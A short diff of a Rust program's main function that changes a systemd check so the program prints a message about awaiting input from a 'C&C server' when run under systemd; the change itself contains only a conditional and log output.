@@ -375,7 +375,9 @@ fn main() {
  
   // We can only start a run here, if this is not
   // run through systemd
-  if !is_systemd_process() {
+  if is_systemd_process() {
+    println!("=> Executed by systemd. Waiting for input from C&C server!");
+  } else {
     // if we are not as systemd, 
     // always end when we are done
     println!("=> We are not run by systemd, so we will stop the program when it is done");
